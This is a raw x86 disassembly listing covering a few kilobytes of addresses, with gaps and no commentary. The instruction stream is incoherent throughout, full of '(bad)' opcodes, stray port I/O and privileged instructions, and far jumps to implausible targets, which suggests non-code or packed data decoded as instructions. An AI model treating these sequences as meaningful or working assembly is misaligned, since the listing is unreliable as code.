  42b359:	sar    edx,cl
  42b35b:	lods   al,BYTE PTR ds:[esi]
  42b35c:	std    
  42b35d:	(bad)  
  42b35e:	leave  
  42b35f:	ror    DWORD PTR [esi-0x12],0x91
  42b363:	ret    
  42b364:	cmpxchg BYTE PTR [esi+esi*2],bh
  42b368:	cdq    
  42b369:	and    edi,eax
  42b36b:	aas    
  42b36c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b36d:	fwait
  42b36e:	dec    ebp
  42b36f:	scas   eax,DWORD PTR es:[edi]
  42b370:	dec    ebp
  42b371:	add    DWORD PTR ds:0xf1a753c0,ebp
  42b377:	in     al,0xef
  42b379:	or     dl,ah
  42b37b:	add    DWORD PTR [ecx],0x68c1b482
  42b381:	loope  0x42b3f1
  42b383:	dec    edi
  42b384:	xor    eax,0x372f4868
  42b389:	(bad)  
  42b38a:	fsub   DWORD PTR [edx]
  42b38c:	xchg   ebp,eax
  42b38d:	ret    0x4755
  42b390:	fstp   DWORD PTR [esi-0x16]
  42b393:	ror    BYTE PTR [ecx],cl
  42b395:	sbb    bh,dl
  42b397:	cs inc ecx
  42b399:	mov    bl,0xcc
  42b39b:	(bad)  
  42b39e:	sbb    DWORD PTR [edx],esp
  42b3a0:	pop    es
  42b3a1:	xchg   esi,eax
  42b3a2:	test   eax,0xd0748a66
  42b3a7:	ss mov edx,ebx
  42b3aa:	xchg   edi,eax
  42b3ab:	jae    0x42b3e3
  42b3ad:	mov    eax,0x9e738862
  42b3b2:	add    edx,DWORD PTR [eax+ecx*4-0x5240a1bd]
  42b3b9:	sub    edx,esi
  42b3bb:	ret    0x2357
  42b3be:	cmp    esi,DWORD PTR [eax+eax*2]
  42b3c1:	call   0xf4002def
  42b3c6:	jp     0x42b3ed
  42b3c8:	xchg   edx,eax
  42b3c9:	test   DWORD PTR [esi+0x4f],esi
  42b3cc:	cmp    esp,DWORD PTR [edx+0x5ff6a7e5]
  42b3d2:	add    edi,ecx
  42b3d4:	xchg   DWORD PTR [eax],esi
  42b3d6:	in     eax,dx
  42b3d7:	or     eax,DWORD PTR [ecx]
  42b3d9:	clc    
  42b3da:	retf   
  42b3db:	ins    BYTE PTR es:[edi],dx
  42b3dc:	inc    edx
  42b3dd:	fadd   QWORD PTR [eax]
  42b3df:	jb     0x42b41d
  42b3e1:	pop    ecx
  42b3e2:	jle    0x42b3e7
  42b3e4:	(bad)  
  42b3e5:	jle    0x42b3a8
  42b3e7:	xor    dl,ch
  42b3e9:	push   eax
  42b3ea:	inc    edx
  42b3eb:	push   es
  42b3ec:	pop    ebp
  42b3ed:	stc    
  42b3ee:	enter  0xec11,0xbf
  42b3f2:	(bad)  
  42b3f3:	push   0xffffffed
  42b3f5:	jns    0x42b3ef
  42b3f7:	mov    dh,BYTE PTR [edx+0x33ccc726]
  42b3fd:	lea    esi,ds:0x1d6c4a95
  42b403:	aad    0x1
  42b405:	xchg   ebp,eax
  42b406:	enter  0xe9b0,0x2d
  42b40a:	xor    al,0x1d
  42b40c:	mov    eax,ds:0xfb0efc
	...
  42b471:	add    BYTE PTR [eax],al
  42b473:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   ecx,eax
  42b481:	lea    ebx,[ebx]
  42b483:	sbb    eax,eax
  42b485:	into   
  42b486:	add    DWORD PTR [eax],eax
  42b488:	add    al,0x1
  42b48a:	add    BYTE PTR [eax],al
  42b48c:	add    esp,DWORD PTR [ebp+0x21]
  42b48f:	add    dl,BYTE PTR [eax]
  42b491:	mov    bh,0x2c
  42b493:	xor    eax,0x9d2acd05
  42b498:	push   cs
  42b499:	daa    
  42b49a:	add    DWORD PTR [esi-0x74],0x3e
  42b49e:	and    eax,0xcc172bcd
  42b4a3:	push   0x59797af7
  42b4a8:	and    esi,ebx
  42b4aa:	dec    eax
  42b4ab:	mov    dl,0xbb
  42b4ad:	aaa    
  42b4ae:	popa   
  42b4af:	gs jo  0x42b49d
  42b4b2:	pop    ebp
  42b4b3:	pop    es
  42b4b4:	cmp    ah,ch
  42b4b6:	or     eax,0x1282b89c
  42b4bb:	bound  eax,QWORD PTR [eax-0x4d6ce9d2]
  42b4c1:	inc    edx
  42b4c2:	in     eax,dx
  42b4c3:	or     al,0x34
  42b4c5:	cmp    BYTE PTR [ecx],0x5d
  42b4c8:	mov    bh,ah
  42b4ca:	in     al,0x44
  42b4cc:	dec    edx
  42b4cd:	push   ds
  42b4ce:	mul    BYTE PTR [edi]
  42b4d0:	pop    ecx
  42b4d1:	pop    ss
  42b4d2:	test   al,0x51
  42b4d4:	sahf   
  42b4d5:	aam    0x82
  42b4d7:	mov    bh,BYTE PTR [ebx+0x58]
  42b4da:	stos   DWORD PTR es:[edi],eax
  42b4db:	out    dx,al
  42b4dc:	xchg   esp,eax
  42b4dd:	jg     0x42b48c
  42b4df:	out    0x39,al
  42b4e1:	pop    esi
  42b4e2:	dec    eax
  42b4e3:	les    edi,FWORD PTR [esp+ebp*2]
  42b4e6:	push   eax
  42b4e7:	cs or  eax,0x94737fff
  42b4ed:	ja     0x42b50e
  42b4ef:	or     ebp,DWORD PTR [ebp-0x55ec9064]
  42b4f5:	test   BYTE PTR [eax-0x30],0xde
  42b4f9:	jb     0x42b50f
  42b4fb:	shr    DWORD PTR [eax+0x73],0xc3
  42b4ff:	js     0x42b4b0
  42b501:	shl    BYTE PTR [ebp+0x410e2996],1
  42b507:	cli    
  42b508:	out    0x40,al
  42b50a:	and    edx,DWORD PTR [eax+esi*1]
  42b50d:	mov    DWORD PTR [edx],esi
  42b50f:	fild   WORD PTR [eax+0x43fbbcd2]
  42b515:	popa   
  42b516:	mov    eax,0x9fb65368
  42b51b:	push   ss
  42b51c:	aad    0x7e
  42b51e:	pusha  
  42b51f:	mov    edi,0x32d898b7
  42b524:	and    al,0x1
  42b526:	pop    ss
  42b527:	mov    cl,0xb8
  42b529:	fld    QWORD PTR [edi]
  42b52b:	sub    esp,DWORD PTR [edi-0x72e278c7]
  42b531:	mov    bl,BYTE PTR [ebp+0xbc4b070]
  42b537:	sbb    eax,0xd6cdd753
  42b53c:	xor    esp,DWORD PTR ds:0x75db5aea
  42b542:	cmp    DWORD PTR [esi+ecx*4],eax
  42b545:	lods   eax,DWORD PTR ds:[esi]
  42b546:	dec    eax
  42b547:	cwde   
  42b548:	mov    ds:0x500d6a37,eax
  42b54d:	loope  0x42b5b0
  42b54f:	lods   al,BYTE PTR ds:[esi]
  42b550:	(bad)  [edi]
  42b552:	loopne 0x42b566
  42b554:	sar    bl,cl
  42b556:	inc    ebx
  42b557:	ds cmp bl,al
  42b55a:	fild   DWORD PTR [ecx]
  42b55c:	(bad)  
  42b55e:	or     al,0x84
  42b560:	mov    DWORD PTR [edx+0x7b59306],esp
  42b566:	adc    ecx,DWORD PTR [esi]
  42b568:	jo     0x42b4fe
  42b56a:	jmp    0x2cec:0xe69a946b
  42b571:	push   ebp
  42b572:	test   eax,0x956c126d
  42b577:	mov    BYTE PTR [ebp+0x5ea0d0b6],bl
  42b57d:	cmp    dh,cl
  42b57f:	icebp  
  42b580:	sbb    al,0x56
  42b582:	add    eax,0xa0fc3b76
  42b587:	inc    esp
  42b588:	fisub  WORD PTR [ebx]
  42b58a:	jmp    0x42b5b7
  42b58c:	ret    0x5df7
  42b58f:	dec    edx
	...
  42b5f4:	loopne 0x42b58a
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	push   es
  42b601:	outs   dx,BYTE PTR ds:[esi]
  42b602:	add    BYTE PTR [edi-0x3c],cl
  42b605:	iret   
  42b606:	add    DWORD PTR [eax],eax
  42b608:	add    al,0x1
  42b60a:	add    BYTE PTR [eax],al
  42b60c:	jae    0x42b61a
  42b60e:	inc    edi
  42b60f:	ins    BYTE PTR es:[edi],dx
  42b610:	mov    eax,0x5c42c1e8
  42b615:	call   0x89e8:0x7043c2a7
  42b61c:	xor    BYTE PTR [edi],bl
  42b61e:	mov    ebp,0x23fe9e3f
  42b623:	jge    0x42b5f0
  42b625:	pop    ss
  42b626:	xchg   esi,eax
  42b628:	ins    BYTE PTR es:[edi],dx
  42b629:	mov    ebx,0x75897084
  42b62e:	dec    ecx
  42b62f:	int3   
  42b630:	xchg   edx,eax
  42b631:	or     ecx,DWORD PTR [edx-0x79322cb9]
  42b637:	mov    ecx,?
  42b639:	lods   al,BYTE PTR ds:[esi]
  42b63a:	cs push esp
  42b63c:	fcomp  QWORD PTR [esi]
  42b63e:	mov    ebx,0xd1615fbd
  42b643:	dec    esp
  42b644:	or     bh,BYTE PTR [ebx-0x14241960]
  42b64a:	and    ch,BYTE PTR [ebx+0x7f48b5d]
  42b650:	push   es
  42b651:	mov    ah,0xa9
  42b653:	pushf  
  42b654:	adc    eax,0xff3dc9b7
  42b659:	push   edi
  42b65a:	in     eax,0xd7
  42b65c:	(bad)  
  42b65d:	xlat   BYTE PTR ds:[ebx]
  42b65e:	xchg   edx,eax
  42b65f:	push   edi
  42b660:	clc    
  42b661:	popa   
  42b662:	inc    edi
  42b663:	add    BYTE PTR [ecx+0x5c06fcdf],dh
  42b669:	xor    edi,eax
  42b66b:	out    dx,eax
  42b66c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b66d:	int3   
  42b66e:	mov    cl,0xfc
  42b670:	sub    eax,0xdf7a5d98
  42b675:	adc    DWORD PTR [esi-0x2f09a8c8],0xa28c03d1
  42b67f:	xor    DWORD PTR [ecx],esi
  42b681:	loop   0x42b6f9
  42b683:	dec    edi
  42b684:	iret   
  42b685:	(bad)  
  42b686:	xchg   ebp,eax
  42b687:	mov    dh,0xa8
  42b689:	push   ebx
  42b68a:	test   WORD PTR [edi],bx
  42b68d:	sti    
  42b68e:	hlt    
  42b68f:	dec    esp
  42b690:	dec    ecx
  42b691:	mov    WORD PTR [edi+edi*8-0x1234e7af],cs
  42b698:	push   esp
  42b699:	mov    cl,0x6
  42b69b:	jp     0x42b622
  42b69d:	leave  
  42b69e:	lods   eax,DWORD PTR ds:[esi]
  42b69f:	mov    DWORD PTR [esi-0x73b9e102],ebx
  42b6a5:	mov    ch,0xc9
  42b6a7:	rol    BYTE PTR [eax-0x36],cl
  42b6aa:	fadd   QWORD PTR [eax+eax*1+0x53]
  42b6ae:	xor    BYTE PTR ss:[ebp+0xf],bh
  42b6b2:	push   cs
  42b6b3:	mov    ds:0x4364cb7,eax
  42b6b8:	jmp    0xa90be834
  42b6bd:	push   0xfffffffc
  42b6bf:	icebp  
  42b6c0:	mov    bl,0x63
  42b6c2:	mov    ah,0x72
  42b6c4:	add    eax,0xe660e6a6
  42b6c9:	daa    
  42b6ca:	jmp    0x680b:0xc6c812e1
  42b6d1:	pop    edi
  42b6d2:	jmp    0x42b6e5
  42b6d4:	pushf  
  42b6d5:	loope  0x42b6e8
  42b6d7:	pop    eax
  42b6d8:	outs   dx,BYTE PTR ds:[esi]
  42b6d9:	jl     0x42b673
  42b6db:	sub    DWORD PTR [eax],edi
  42b6dd:	sar    BYTE PTR [esi-0x48],1
  42b6e0:	and    DWORD PTR [ebp-0x76840a9c],edi
  42b6e6:	imul   ecx,DWORD PTR ds:0xad58b5fe,0x3a
  42b6ed:	test   eax,0x4ca6b74e
  42b6f2:	push   ds
  42b6f3:	push   es
  42b6f4:	mov    ebp,0x26c0a981
  42b6f9:	mov    eax,0x296a357
  42b6fe:	outs   dx,DWORD PTR ds:[esi]
  42b6ff:	xchg   edi,eax
  42b700:	mov    ch,BYTE PTR [eax-0x27cd050f]
  42b706:	popa   
  42b707:	fsubr  QWORD PTR [ebp-0x44]
  42b70a:	mov    DWORD PTR [ebx+0x790fafd2],ecx
	...
  42b774:	dec    esi
  42b775:	inc    edx
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	jl     0x42b7f8
  42b782:	dec    esp
  42b783:	xor    cl,al
  42b785:	rol    BYTE PTR [ecx],1
  42b787:	add    BYTE PTR [ecx+eax*1],al
  42b78a:	add    BYTE PTR [eax],al
  42b78c:	add    DWORD PTR [esi+0x3c9e67c1],0x96c75003
  42b796:	rcl    BYTE PTR [ebx-0x52],cl
  42b799:	xor    DWORD PTR [ebx],edx
  42b79b:	call   0xbb66:0x7ad77506
  42b7a2:	jne    0x42b738
  42b7a4:	inc    ebx
  42b7a5:	push   ss
  42b7a6:	fstp   DWORD PTR [ebp+0x9]
  42b7a9:	int    0x88
  42b7ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b7ac:	jnp    0x42b734
  42b7ae:	in     al,dx
  42b7af:	or     DWORD PTR [edx-0x2241e0e4],edi
  42b7b5:	add    al,0xb9
  42b7b7:	in     eax,dx
  42b7b8:	xor    BYTE PTR [edx-0x505fe768],0x4b
  42b7bf:	jle    0x42b822
  42b7c1:	cwde   
  42b7c2:	rep outs dx,BYTE PTR ds:[esi]
  42b7c4:	aam    0x3b
  42b7c6:	add    cl,BYTE PTR [eax]
  42b7c8:	sub    al,BYTE PTR [esi]
  42b7ca:	and    DWORD PTR [ebx],ebx
  42b7cc:	repz sbb ch,ah
  42b7cf:	(bad)  
  42b7d0:	xchg   ebx,eax
  42b7d1:	repnz mov edi,0x8e69b865
  42b7d7:	shr    BYTE PTR [esi+0x67ee621f],1
  42b7dd:	(bad)  
  42b7de:	clc    
  42b7df:	bound  esp,QWORD PTR ds:0x16698e5d
  42b7e5:	ret    
  42b7e6:	dec    esi
  42b7e7:	test   BYTE PTR [ebx-0x1565f0a6],bl
  42b7ed:	in     eax,0x55
  42b7ef:	sub    al,0x37
  42b7f1:	lahf   
  42b7f2:	mov    edi,esp
  42b7f4:	jmp    0x42b81b
  42b7f6:	in     al,dx
  42b7f7:	popa   
  42b7f8:	cmp    eax,0x48df4b1f
  42b7fd:	bound  ebp,QWORD PTR [ecx-0x32bb751c]
  42b803:	gs dec ebp
  42b805:	sbb    al,0x6d
  42b807:	scas   eax,DWORD PTR es:[edi]
  42b808:	jmp    0x86b68399
  42b80d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b80e:	mov    ds:0x9d745fd1,eax
  42b813:	cmp    al,dh
  42b815:	adc    DWORD PTR [esi-0x4823de6e],edi
  42b81b:	lahf   
  42b81c:	cwde   
  42b81d:	pop    esp
  42b81e:	popf   
  42b81f:	ds pop esi
  42b821:	sbb    ch,0x67
  42b824:	dec    edx
  42b825:	add    esi,DWORD PTR [ecx+0x5a]
  42b828:	outs   dx,DWORD PTR ds:[esi]
  42b829:	fistp  DWORD PTR [edi-0x14f1a437]
  42b82f:	loop   0x42b884
  42b831:	bound  edx,QWORD PTR [edi+0x1a4ac584]
  42b837:	push   edi
  42b838:	push   0xd2b62676
  42b83d:	pusha  
  42b83e:	mov    edx,0x5b2d71ed
  42b843:	icebp  
  42b844:	adc    dh,BYTE PTR [edi+0x72c1ac60]
  42b84a:	shr    DWORD PTR [ecx+0x4d53e381],0xaf
  42b851:	mov    DWORD PTR [ebx+ebx*8],ecx
  42b854:	lods   eax,DWORD PTR ds:[esi]
  42b855:	scas   al,BYTE PTR es:[edi]
  42b856:	popf   
  42b857:	js     0x42b866
  42b859:	mov    al,BYTE PTR [ecx+0x17bb15c]
  42b85f:	cmp    al,0xe9
  42b861:	xchg   ebx,eax
  42b862:	jo     0x42b830
  42b864:	push   edx
  42b865:	xchg   edi,eax
  42b866:	shl    BYTE PTR [edi],cl
  42b868:	lea    edx,[esi-0xd]
  42b86b:	les    esi,FWORD PTR [ecx]
  42b86d:	test   ch,ah
  42b86f:	inc    edx
  42b870:	ja     0x42b8a9
  42b872:	fdivr  DWORD PTR [edi]
  42b874:	mov    edi,0x15590919
  42b879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b87a:	xchg   edi,eax
  42b87b:	ret    0xfeb4
  42b87e:	mov    eax,ds:0x18bd9
  42b883:	jbe    0x42b855
  42b885:	push   edi
  42b886:	outs   dx,BYTE PTR ds:[esi]
  42b887:	or     al,0xd7
  42b889:	dec    edi
  42b88a:	in     al,dx
  42b88b:	or     esp,DWORD PTR [edi+0xc5b9d5]
	...
  42b8f1:	add    BYTE PTR [eax],al
  42b8f3:	add    al,ch
  42b8f5:	popf   
  42b8f6:	mov    esi,0xf9e7ffe7
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     esp,DWORD PTR [ebp-0x4c]
  42b902:	fmul   st(0),st
  42b904:	int3   
  42b905:	rol    DWORD PTR [ecx],1
  42b907:	add    BYTE PTR [ecx+eax*1],al
  42b90a:	add    BYTE PTR [eax],al
  42b90c:	cmp    al,0x5d
  42b90e:	sbb    DWORD PTR [esi],esi
  42b910:	in     eax,0x20
  42b912:	sbb    DWORD PTR [esi-0x12],esp
  42b915:	ins    BYTE PTR es:[edi],dx
  42b916:	retf   
  42b917:	sbb    edi,DWORD PTR [edi+0x3e318557]
  42b91d:	pop    edx
  42b91e:	add    dh,BYTE PTR [ebx+0x4c]
  42b921:	js     0x42b91e
  42b923:	push   eax
  42b924:	stos   DWORD PTR es:[edi],eax
  42b925:	push   edi
  42b926:	out    dx,eax
  42b927:	out    0xea,eax
  42b929:	test   eax,0x8e2b572a
  42b92e:	cmp    dl,BYTE PTR [edi+0x54]
  42b931:	test   DWORD PTR [edx-0x28],esi
  42b934:	jae    0x42b928
  42b936:	shl    esi,cl
  42b938:	xor    DWORD PTR [edi+esi*2-0x4a],edi
  42b93c:	int    0x20
  42b93e:	sbb    BYTE PTR [esi],0xa
  42b941:	repz fsubr DWORD PTR [edx]
  42b944:	mov    dl,0xb7
  42b946:	cli    
  42b947:	jl     0x42b8e8
  42b949:	aam    0xd9
  42b94b:	xor    esi,esi
  42b94d:	push   ss
  42b94e:	mov    DWORD PTR [edi],esp
  42b950:	outs   dx,DWORD PTR ds:[esi]
  42b951:	mov    ch,BYTE PTR [eax-0x7cf4bfb0]
  42b957:	fcom   DWORD PTR [ebp+0x1e]
  42b95a:	ins    BYTE PTR es:[edi],dx
  42b95b:	in     al,dx
  42b95c:	out    dx,eax
  42b95d:	pop    edi
  42b95e:	(bad)  
  42b95f:	lods   eax,DWORD PTR ds:[esi]
  42b960:	mov    al,0x19
  42b962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b963:	scas   al,BYTE PTR es:[edi]
  42b964:	in     eax,0xc5
  42b966:	push   esp
  42b967:	imul   ebp,DWORD PTR [ebp+0x62f1d3e5],0xfffffff7
  42b96e:	sbb    al,0x85
  42b970:	adc    al,0x84
  42b972:	jno    0x42b957
  42b974:	cmp    DWORD PTR [edx+ecx*4-0x746776a],0x1d
  42b97c:	lds    edi,FWORD PTR [ebx-0x4c]
  42b97f:	jle    0x42b96e
  42b981:	xchg   ebp,eax
  42b982:	ins    DWORD PTR es:[di],dx
  42b984:	jmp    FWORD PTR [edx-0xf5aa7a4]
  42b98a:	cmp    al,0x3
  42b98c:	cwde   
  42b98d:	mov    es,WORD PTR [eax+esi*8]
  42b990:	push   ds
  42b991:	mov    dh,0xcc
  42b993:	mov    esp,esi
  42b995:	jmp    0xa84b:0x99855dae
  42b99c:	ins    DWORD PTR es:[edi],dx
  42b99d:	mov    ebx,eax
  42b99f:	fisub  DWORD PTR [eax]
  42b9a1:	test   DWORD PTR [eax+0x3dfb3edb],0x4947021d
  42b9ab:	mov    BYTE PTR [ecx+0x35898eb6],bh
  42b9b1:	push   edx
  42b9b2:	pop    ecx
  42b9b3:	mov    edi,0xdfd7a160
  42b9b8:	push   edi
  42b9b9:	fisubr WORD PTR [eax-0x1e]
  42b9bc:	xchg   ebp,eax
  42b9bd:	jns    0x42ba1a
  42b9bf:	ja     0x42ba17
  42b9c1:	dec    ecx
  42b9c2:	les    esi,FWORD PTR [esi+0x19df1cf1]
  42b9c8:	jb     0x42b964
  42b9ca:	cmc    
  42b9cb:	ret    0x7f64
  42b9ce:	mov    esi,0x638d253d
  42b9d3:	jmp    0x42b957
  42b9d5:	xor    ah,BYTE PTR [ebp-0x3116ac8]
  42b9db:	pop    ss
  42b9dc:	aaa    
  42b9dd:	mov    ecx,DWORD PTR ds:0x1d8c1697
  42b9e3:	add    ebp,ebx
  42b9e5:	xor    edi,0xf10f7ebc
  42b9eb:	sub    ch,BYTE PTR [edi]
  42b9ed:	inc    edx
  42b9ee:	jg     0x42b9c0
  42b9f0:	adc    BYTE PTR [edx-0x4ea0fbf0],cl
  42b9f6:	add    eax,0xb0eefbf3
  42b9fb:	(bad)  
  42b9fc:	loopne 0x42b9f9
  42b9fe:	cs pop esi
  42ba00:	arpl   WORD PTR [edx+0x69],di
  42ba03:	arpl   WORD PTR [ecx-0x21],sp
  42ba06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ba07:	mov    esp,0xc1613197
  42ba0c:	cdq    
  42ba0d:	cmp    eax,0xa7dc
	...
  42ba72:	add    BYTE PTR [eax],al
  42ba74:	mov    eax,DWORD PTR [edi]
  42ba76:	mov    al,0xe2
  42ba78:	mov    esp,0x6a6fdbf7
  42ba7d:	pop    ebx
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [edx-0x2fd3be2b],eax
  42ba85:	rol    BYTE PTR [ecx],cl
  42ba87:	add    BYTE PTR [ecx+eax*1],al
  42ba8a:	add    BYTE PTR [eax],al
  42ba8c:	mov    ebp,DWORD PTR [ebx+ecx*8+0x52]
  42ba90:	jg     0x42ba13
  42ba92:	pop    ecx
  42ba93:	out    0x7b,al
  42ba95:	sub    ah,0xe2
  42ba98:	lods   eax,DWORD PTR ds:[esi]
  42ba99:	mov    al,ds:0x8d2f532d
  42ba9e:	xor    eax,0xc003cfa4
  42baa3:	inc    edi
  42baa4:	adc    eax,0xb3ca038
  42baa9:	push   es
  42baaa:	sbb    eax,0x85c5c1c1
  42baaf:	mov    DWORD PTR ds:[eax-0x2d9470b0],eax
  42bab6:	nop
  42bab7:	dec    edi
  42bab8:	fst    QWORD PTR [eax-0x9]
  42babb:	and    DWORD PTR [eax+ecx*2],edx
  42babe:	xchg   edx,eax
  42babf:	add    esp,esi
  42bac1:	fs ret 0xed5f
  42bac5:	loope  0x42bae8
  42bac7:	push   edi
  42bac8:	jb     0x42bae2
  42baca:	xchg   ebx,eax
  42bacb:	push   ds
  42bacc:	xchg   ecx,eax
  42bacd:	div    bl
  42bacf:	push   ds
  42bad0:	hlt    
  42bad1:	das    
  42bad2:	pop    esp
  42bad3:	lea    edx,gs:[esi]
  42bad6:	out    dx,al
  42bad7:	mov    BYTE PTR [ebx+0x197d533],ch
  42badd:	jne    0x42bb57
  42badf:	inc    eax
  42bae0:	mov    ch,BYTE PTR [ebx-0x4ddca2c3]
  42bae6:	popf   
  42bae7:	cmp    al,bh
  42bae9:	cs ja  0x42bb11
  42baec:	and    edi,DWORD PTR [eax+0x1b]
  42baef:	ds push edi
  42baf1:	mov    DWORD PTR ds:0x1f094bff,ecx
  42baf7:	xchg   edi,eax
  42baf8:	mov    eax,0xfc1a1d9
  42bafd:	fimul  DWORD PTR [edi+0x6b6f2f1]
  42bb03:	lea    ebp,[edx-0x39b69c9e]
  42bb09:	pop    edx
  42bb0a:	call   0xdff:0xda661524
  42bb11:	aas    
  42bb12:	and    BYTE PTR [ebx+0x4b],ah
  42bb15:	cld    
  42bb16:	xchg   BYTE PTR [ecx+0x5b],ch
  42bb19:	cld    
  42bb1a:	mov    ds,WORD PTR [eax]
  42bb1c:	rcl    BYTE PTR [edx+ecx*8+0x44],cl
  42bb20:	icebp  
  42bb21:	lods   eax,DWORD PTR ds:[esi]
  42bb22:	lods   eax,DWORD PTR ds:[esi]
  42bb23:	(bad)  
  42bb24:	ss test al,0x59
  42bb27:	scas   eax,DWORD PTR es:[edi]
  42bb28:	mov    edx,0xe6855d73
  42bb2d:	mov    cl,BYTE PTR [edi+0x26]
  42bb30:	pop    ebx
  42bb31:	inc    edi
  42bb32:	mov    bh,0xa4
  42bb34:	cmp    edi,DWORD PTR [esp+ebx*4]
  42bb37:	out    dx,eax
  42bb38:	inc    ebp
  42bb39:	xor    al,0x87
  42bb3b:	cmp    eax,0x313d5147
  42bb40:	test   BYTE PTR [edx-0x47],bl
  42bb43:	fstp   QWORD PTR [ebx]
  42bb45:	xor    bh,ah
  42bb47:	popf   
  42bb48:	push   ebp
  42bb49:	lea    esp,[edi]
  42bb4b:	push   edx
  42bb4c:	or     edx,DWORD PTR [ecx-0x48]
  42bb4f:	mov    WORD PTR [eax+ebp*8],es
  42bb52:	pop    esi
  42bb53:	shl    DWORD PTR [ebp+0x10],1
  42bb56:	stos   BYTE PTR es:[edi],al
  42bb57:	add    DWORD PTR [edi-0x34],0x4
  42bb5b:	(bad)  
  42bb5d:	inc    esp
  42bb5e:	ins    DWORD PTR es:[edi],dx
  42bb5f:	mov    dl,ch
  42bb61:	dec    ecx
  42bb62:	jo     0x42bb12
  42bb64:	test   edi,esi
  42bb66:	jnp    0x42bb0d
  42bb68:	or     edx,DWORD PTR [edx+0x14]
  42bb6b:	loope  0x42bb11
  42bb6d:	and    eax,0x4fb0878e
  42bb72:	xor    al,0xb
  42bb74:	jbe    0x42bbbb
  42bb76:	stc    
  42bb77:	mov    gs,WORD PTR [ecx-0x59]
  42bb7a:	xchg   edi,eax
  42bb7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb7c:	xchg   esp,eax
  42bb7d:	dec    ecx
  42bb7e:	daa    
  42bb7f:	mov    ?,WORD PTR [eax+eiz*2+0x26]
  42bb83:	sub    eax,0xac9f903a
  42bb88:	sbb    esp,DWORD PTR [ebp+0x7e8d959d]
  42bb8e:	jne    0x42bc07
	...
  42bbf4:	xor    al,0x28
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	in     al,0xe0
  42bc02:	jns    0x42bc64
  42bc04:	aam    0xd3
  42bc06:	add    DWORD PTR [eax],eax
  42bc08:	add    al,0x1
  42bc0a:	add    BYTE PTR [eax],al
  42bc0c:	or     eax,0xa6d43e86
  42bc11:	push   edi
  42bc12:	mov    dl,0x68
  42bc14:	js     0x42bc8d
  42bc16:	jle    0x42bc58
  42bc18:	adc    DWORD PTR [edi-0x45],0xb1db6012
  42bc1f:	dec    ecx
  42bc20:	or     al,0x43
  42bc22:	mov    ebp,0xdaf75f4a
  42bc27:	and    BYTE PTR [eax],ah
  42bc29:	sub    eax,0x19e7f79f
  42bc2e:	aaa    
  42bc2f:	pop    edi
  42bc30:	ss mov bl,0xc4
  42bc33:	xchg   edi,eax
  42bc34:	pop    ebp
  42bc35:	aam    0x1d
  42bc37:	hlt    
  42bc38:	sti    
  42bc39:	and    al,0x2
  42bc3b:	dec    ebx
  42bc3c:	pop    es
  42bc3d:	shl    BYTE PTR [ebp-0x5c0b2a7b],1
  42bc43:	mov    edi,0xe0f6c2ce
  42bc48:	test   esp,0x5ccd310a
  42bc4e:	add    DWORD PTR [edx+0x3574fd51],ebx
  42bc54:	mov    dl,0xbf
  42bc56:	sbb    DWORD PTR [ebx+0x14],0x56
  42bc5a:	cmp    BYTE PTR [ecx],dl
  42bc5c:	mov    edi,0x3229d449
  42bc61:	inc    edx
  42bc62:	jle    0x42bccc
  42bc64:	inc    ecx
  42bc65:	sub    al,0xa
  42bc67:	nop
  42bc68:	imul   BYTE PTR [ebx-0x78686715]
  42bc6e:	sub    BYTE PTR [edi+ebx*4+0xb],al
  42bc72:	or     al,0x6a
  42bc74:	shl    BYTE PTR [edi],0xa7
  42bc77:	addr16 xor al,0x5f
  42bc7b:	xchg   bl,al
  42bc7d:	xor    dh,BYTE PTR [ebx]
  42bc7f:	mov    ecx,0x775fa680
  42bc84:	jl     0x42bc43
  42bc86:	mul    BYTE PTR [ebx-0x3d]
  42bc89:	fadd   QWORD PTR [ecx-0x669525d]
  42bc8f:	pop    esp
  42bc90:	imul   edi,ecx,0xbc7ca3c9
  42bc96:	pop    ebp
  42bc97:	and    al,0x26
  42bc99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bc9a:	fcomi  st,st(4)
  42bc9c:	or     DWORD PTR [edi-0x13],0x34
  42bca0:	xlat   BYTE PTR ds:[ebx]
  42bca1:	sub    esp,esp
  42bca3:	and    eax,0xa5f1d016
  42bca8:	push   esi
  42bca9:	and    eax,0x1e08c672
  42bcae:	mov    esi,0x89cc6f4
  42bcb3:	in     al,0xcd
  42bcb5:	push   esp
  42bcb6:	cmp    eax,0xc37d5b4a
  42bcbb:	in     eax,0xfb
  42bcbd:	jno    0x42bd10
  42bcbf:	imul   ebp,DWORD PTR [ebp-0x4587a37d],0x16
  42bcc6:	jg     0x42bd10
  42bcc8:	cdq    
  42bcc9:	fs xchg ebx,eax
  42bccb:	sbb    DWORD PTR [ebx],edx
  42bccd:	sub    eax,0x14f1c381
  42bcd2:	cmc    
  42bcd3:	or     ecx,esp
  42bcd5:	jecxz  0x42bc6d
  42bcd7:	int3   
  42bcd8:	pop    ss
  42bcd9:	leave  
  42bcda:	push   esp
  42bcdb:	adc    DWORD PTR [edi-0x7e],0xab2c3d37
  42bce2:	hlt    
  42bce3:	xchg   BYTE PTR [edi],bl
  42bce5:	or     DWORD PTR [ebx],edx
  42bce7:	mov    BYTE PTR [eax+edx*1-0x54],bl
  42bceb:	jmp    0xdd7b:0x9379c632
